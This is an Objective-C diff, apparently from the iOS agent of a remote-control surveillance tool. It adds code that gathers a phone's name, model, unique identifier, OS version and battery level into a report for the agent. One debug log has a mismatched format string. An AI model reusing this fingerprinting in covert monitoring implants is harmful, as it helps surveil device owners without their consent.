@@ -93,14 +93,36 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
   
   NSData *retData = nil;
   NSString *systemInfoStr = nil;
-
-  systemInfoStr = [[NSString alloc] initWithFormat: @"%s", "OS type:\n\tiOS"];
+ 
+  UIDevice *device = [UIDevice currentDevice];
+  
+#ifdef DEBUG_TMP
+  NSLog(@"%s: device %@ %@ %@ %@ %@ major(%@)", 
+        __FUNCTION__, 
+        [device name],
+        [device model],
+        [device uniqueIdentifier],
+        [device systemVersion],
+        [device systemName]);
+#endif
+  
+  device.batteryMonitoringEnabled = YES;
+  
+  systemInfoStr = [[NSString alloc] initWithFormat: @"\nDevice info:\n\nName:\t\t%@\nModel:\t\t%@\nSystem:\t\t%@\nVersion:\t%@\nUniqID:\t\t%@\nBattery:\t%f",
+                   [device name],
+                   [device model],
+                   [device systemName],
+                   [device systemVersion],
+                   [device uniqueIdentifier],
+                   [device batteryLevel]];
 
   retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
   
 #ifdef  DEBUG_DEVICE
     NSLog(@"%s: HW INFO retData %@", __FUNCTION__, retData);
 #endif
+  
+  [systemInfoStr release];
 
   [pool release];
   
